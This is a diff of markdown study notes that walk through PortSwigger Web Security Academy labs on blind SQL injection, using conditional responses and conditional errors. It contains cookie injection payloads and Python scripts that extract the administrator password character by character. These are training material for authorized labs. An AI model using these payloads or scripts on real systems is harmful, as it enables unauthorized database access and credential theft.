@@ -1185,11 +1185,11 @@ The database contains a different table `users`, with columns called `username` 
 
 ##### Tutorial
 
-1. **Intercept the Login Request**
+1. Intercept the Login Request
 
-   Open the lab page and intercept the `GET /login` request using Burp Suite. Once intercepted, send the request to **Repeater** for further testing.
+   Open the lab page and intercept the `GET /login` request using Burp Suite. Once intercepted, send the request to Repeater for further testing.
 
-2. **Test for SQL Injection**
+2. Test for SQL Injection
 
    Check whether the `TrackingId` cookie parameter is vulnerable to SQL injection by appending a single quote (`'`) to its value:
 
@@ -1197,9 +1197,9 @@ The database contains a different table `users`, with columns called `username` 
    TrackingId=7Itm5DEgpF70MXu9'
    ```
 
-   If the `Welcome back!` message disappears after adding the single quote, it indicates that the input is affecting the SQL query.
+   If the `Welcome back!` message disappears after adding the single quote, it indicates that the input may be affecting the SQL query.
 
-3. **Determine the SQL Comment Syntax**
+3. Determine the SQL Comment Syntax
 
    Append the SQL comment syntax `--+` to terminate the remaining part of the original query:
 
@@ -1207,19 +1207,19 @@ The database contains a different table `users`, with columns called `username` 
    TrackingId=7Itm5DEgpF70MXu9'--+
    ```
 
-   If the `Welcome back!` message reappears, it confirms that the injection is working and that `--+` successfully comments out the remaining SQL statement.
+   If the `Welcome back!` message reappears, it indicates that the injection is working and that `--+` successfully comments out the remaining SQL statement.
 
-4. **Verify the Existence of the `users` Table**
+4. Verify the Existence of the `users` Table
 
-   Test whether the `users` table exists by using a static condition:
+   Test whether the `users` table exists using a static condition:
 
    ```sql
    TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users LIMIT 1)='a'--+
    ```
 
-   If the `Welcome back!` message appears, it indicates that the `users` table exists and that the SQL condition can be controlled.
+   If the `Welcome back!` message appears, it indicates that the `users` table exists and that the injected SQL condition evaluates successfully.
 
-5. **Determine the Administrator Password Length**
+5. Determine the Administrator Password Length
 
    Use the SQL `LENGTH()` function to determine the length of the administrator's password.
 
@@ -1227,19 +1227,17 @@ The database contains a different table `users`, with columns called `username` 
 
    ```sql
    TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--+
-   ```
 
-   ```sql
    TrackingId=7Itm5DEgpF70MXu9' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a'--+
    ```
 
-   In this test, the condition `LENGTH(password)>19` returns the `Welcome back!` message, while `LENGTH(password)>20` does not.
+   In this test, `LENGTH(password)>20` does not return the `Welcome back!` message, while `LENGTH(password)>19` does.
 
-   Therefore, the administrator's password is **20 characters long**.
+   Therefore, the administrator's password is 20 characters long.
 
-6. **Extract the Password Using `SUBSTRING()`**
+6. Extract the Password Using `SUBSTRING()`
 
-   Use the SQL `SUBSTRING()` function to retrieve the password one character at a time.
+   Use the SQL `SUBSTRING()` function to test the password one character at a time.
 
    Change the first numeric argument to specify the character position and replace `'a'` with the character you want to test.
 
@@ -1255,46 +1253,55 @@ The database contains a different table `users`, with columns called `username` 
    TrackingId=7Itm5DEgpF70MXu9' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--+
    ```
 
-   If the `Welcome back!` message appears, it means the tested character matches the character at that position.
+   If the `Welcome back!` message appears, the tested character matches the character at that position.
 
-7. **Repeat the Process for All 20 Characters**
+7. Repeat the Process for All 20 Characters
 
-   Repeat step 6 for positions 1 through 20 until all characters of the password have been identified.
+   Repeat step 6 for positions 1 through 20 until all characters of the administrator's password have been identified.
 
-8. **Automate the Extraction Process with Python**
+8. Automate the Extraction Process with Python
 
-   To speed up the process, automate the extraction using the following Python script:
+   To speed up the process, automate password extraction using the following Python script:
 
    ```python
    import requests
    import string
 
+   # Set the target login URL
    url = "https://0a10003803f349cf80be26a5007c00d1.web-security-academy.net/login"
 
+   # Define the required session cookies
    tracking_id = "7Itm5DEgpF70MXu9"
    session = "3mQEAdAHV0kDtdwEARtu43bCdwniet64"
 
+   # Define possible password characters
    chars = string.ascii_lowercase + string.digits
    password = ""
 
+   # Extract the password character by character
    for position in range(1, 21):
        for char in chars:
+
+           # Inject a Boolean condition into the TrackingId cookie
            cookies = {
                "TrackingId": f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--+",
                "session": session
            }
 
+           # Send the request and check the server response
            response = requests.get(url, cookies=cookies)
 
+           # A matching character triggers the welcome message
            if "Welcome back!" in response.text:
                password += char
                print(f"[+] {position}: {char} -> {password}")
                break
 
+   # Print the extracted password
    print(f"\nPassword: {password}")
    ```
 
-9. **Run the Python Script**
+9. Run the Python Script
 
    Install the required library:
 
@@ -1308,18 +1315,18 @@ The database contains a different table `users`, with columns called `username` 
    python blind-sql-injection-conditional-responses.py
    ```
 
-10. **Log in as the Administrator**
+10. Log in as the Administrator
 
-   Once the script has extracted all 20 characters, log in with the following credentials:
+    Once the script has extracted all 20 characters, log in using the following credentials:
 
-   ```text
-   Username: administrator
-   Password: <extracted password>
-   ```
+    ```text
+    Username: administrator
+    Password: <extracted password>
+    ```
 
-11. **Complete the Lab**
+11. Complete the Lab
 
-   If the login is successful, you'll gain access to the administrator account and the lab will be marked as **Solved**.
+    If the login is successful, you will gain access to the administrator account, and the lab will be marked as Solved.
 
 <details>
 <summary> 24. Blind SQL Injection - How Does It Work? — z3nshell</summary>
@@ -1379,6 +1386,9 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 
 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
 
+<details>
+<summary>Lab details, screenshots & walkthrough 0.10</summary>
+
 The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows, if the SQL query causes an error, then the application returns a custom error message.
 
 The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
@@ -1387,12 +1397,239 @@ To solve the labs, log in as the `administrator` user.
 
 >Note: This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
+![Access Lab 0.10](images/lab-0.10-blind-conditional-errors/01-access-lab-0.10.png)
+
+![Open Pages 0.10](images/lab-0.10-blind-conditional-errors/02-open-pages-0.10.png)
+
+![Activate Proxy 0.10](images/lab-0.10-blind-conditional-errors/03-activate-proxy-0.10.png)
+
+![Check History and Send to Repeater 0.10](images/lab-0.10-blind-conditional-errors/04-send-request-to-repeater-0.10.png)
+
+![Test SQL Injection with Single Quote 0.10](images/lab-0.10-blind-conditional-errors/05-test-single-quote-0.10.png)
+
+![Test SQL Comment Syntax 0.10](images/lab-0.10-blind-conditional-errors/06-test-sql-comment-0.10.png)
+
+![Test TRUE Condition 0.10](images/lab-0.10-blind-conditional-errors/07-test-true-condition-0.10.png)
+
+![Test FALSE Condition 0.10](images/lab-0.10-blind-conditional-errors/08-test-false-condition-0.10.png)
+
+![Password Length Greater Than 1 0.10](images/lab-0.10-blind-conditional-errors/09-password-length-greater-than-1-0.10.png)
+
+![Password Length Greater Than 100 0.10](images/lab-0.10-blind-conditional-errors/10-password-length-greater-than-100-0.10.png)
+
+![Password Length Enumeration Result 0.10](images/lab-0.10-blind-conditional-errors/11-password-length-result-0.10.png)
+
+![Password Length Enumeration Script 0.10](images/lab-0.10-blind-conditional-errors/12-password-length-enumeration-script-0.10.png)
+
+![Test Password with SUBSTR 0.10](images/lab-0.10-blind-conditional-errors/13-test-substring-password-0.10.png)
+
+![Password Character Enumeration Script 0.10](images/lab-0.10-blind-conditional-errors/14-password-character-enumeration-script-0.10.png)
+
+![Administrator Password Extracted 0.10](images/lab-0.10-blind-conditional-errors/15-administrator-password-extracted-0.10.png)
+
+![Administrator Login 0.10](images/lab-0.10-blind-conditional-errors/16-administrator-login-0.10.png)
+
+![Login Success 0.10](images/lab-0.10-blind-conditional-errors/17-login-success-0.10.png)
+
+##### Tutorial
+
+1. Access the target website, intercept an HTTP request, and send it to Burp Suite Repeater.
+
+2. Insert a single quote (`'`) into the `TrackingId` cookie to check the server response and identify possible SQL errors. Then, try adding a SQL comment (`--`) to restore the normal response.
+
+```sql
+Cookie: TrackingId=cf0TIM6uE9oXtwj5'
+Cookie: TrackingId=cf0TIM6uE9oXtwj5'--
+```
+
+3. Test conditional error behavior using `CASE` and `TO_CHAR` to determine TRUE and FALSE conditions.
+
+```sql
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--
+```
+
+Expected responses:
+
+- `1=2`: HTTP 200 (normal response).
+- `1=1`: HTTP 500 (conditional error).
+
+4. Test the target user in the `users` table and check the administrator password length using `LENGTH()`.
+
+```sql
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 100 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+```
+
+Expected behavior:
+
+- `LENGTH(password) > 1`: HTTP 500 if the password is longer than 1 character.
+- `LENGTH(password) > 100`: HTTP 200 if the password is 100 characters or shorter.
+
+For manual testing, narrow down the password length:
+
+```sql
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 19 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN LENGTH(password) > 20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+```
+
+If `>19` returns HTTP 500 and `>20` returns HTTP 200, the password length is 20 characters.
+
+5. Automate password length detection using Python scripting.
+
+```python
+import requests
+
+# Set the target URL
+url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"
+
+# Define session cookies
+tracking_id = "cf0TIM6uE9oXtwj5"
+session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"
+
+# Detect password length
+for length in range(1, 31):
+
+    # Inject conditional error into TrackingId
+    cookies = {
+        "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN LENGTH(password) > {length} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
+        "session": session
+    }
+
+    # Send request and check HTTP response
+    response = requests.get(url, cookies=cookies)
+
+    # HTTP 500 indicates condition TRUE
+    if response.status_code == 500:
+        print(f"[+] Length > {length}: TRUE")
+
+    # HTTP 200 indicates condition FALSE
+    else:
+        print(f"[+] Password length: {length}")
+        break
+```
+
+6. After identifying the password length, use `SUBSTR()` to test individual password characters. Try alphanumeric characters (`A-Z`, `a-z`, `0-9`).
+
+```sql
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = 'a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+
+Cookie: TrackingId=cf0TIM6uE9oXtwj5' AND (SELECT CASE WHEN SUBSTR(password, 1, 1) = '8' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--
+```
+
+Expected behavior:
+
+- Character `a`: HTTP 200 if it does not match.
+- Character `8`: HTTP 500 if it matches.
+
+7. Automate password character enumeration using Python scripting.
+
+```python
+import requests
+import string
+
+# Set the target URL
+url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"
+
+# Define session cookies
+tracking_id = "cf0TIM6uE9oXtwj5"
+session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"
+
+# Define possible password characters
+chars = string.ascii_letters + string.digits
+password = ""
+
+# Extract password character by character
+for position in range(1, 21):
+    for char in chars:
+
+        # Inject SUBSTR condition into TrackingId
+        cookies = {
+            "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
+            "session": session
+        }
+
+        # Send request and check HTTP response
+        response = requests.get(url, cookies=cookies)
+
+        # HTTP 500 indicates matching character
+        if response.status_code == 500:
+            password += char
+            print(f"[+] {position}: {char} -> {password}")
+            break
+
+# Print extracted password
+print(f"\nPassword: {password}")
+```
+
+8. Run the Python script to extract the password character by character. The script tests all 20 positions and identifies matching characters through HTTP 500 responses.
+
+9. Log in using the extracted credentials:
+
+- Username: `administrator`
+- Password: extracted password
+
+10. Verify successful authentication. The lab should now be marked as solved.
+
+<details>
+<summary> 26. Blind SQL Injection With Conditional Errors - Administrator Password Stolen — z3nshell</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=HjXUtCKm1FM
+Purpose: In this tutorial we demonstrate a blind SQL injection attack making use of 'conditional errors'. This is where we provoke the SQL server to leak information by forcing errors when SQL queries are matched.
+</details>
+
+<details>
+<summary>27. SQL Injection - Lab #12 - Blind SQL injection with conditional errors — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=_7w-KEP_K5w
+Purpose: In this video, we cover Lab #12 in the SQL injection track of the Web Security Academy. This lab contains a blind SQL injection vulnerability. To solve the lab, we perform a blind based SQL injection attack on  the database that retrieves the password of the administrator user on the application.
+</details>
+
+<details>
+<summary>28. Blind SQL injection with conditional errors (Video solution, Audio) — Michael Sommer</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=HbaD3maRucc
+Purpose: This video shows the lab solution of "Blind SQL injection with conditional errors" from Web Security Academy (Portswigger)
+</details>
+
+</details>
+
 #### Extracting sensitive data via verbose SQL error messages
 
+Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter.
 
+```sql
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quote string inside a `WHERE` statment. This makes it easier to construct a valid query containing a malicious payload.
+
+Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.
 
 #### Extracting sensitive data via verbose SQL error messages - Continued
+
+Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visble one.
+
+You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+Often, the data that you're trying to read is a string. Attemping to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:
+
+```sql
+ERROR: invalid input syntax for type integer: "Example data"
+```
+This type of query may also be useful if a character limit prevents you from triggering conditional responses.
+
 ##### Lab: Visible error-based SQL injection
+
+
 
 #### Exploiting blind SQL injection by triggering time delays
 
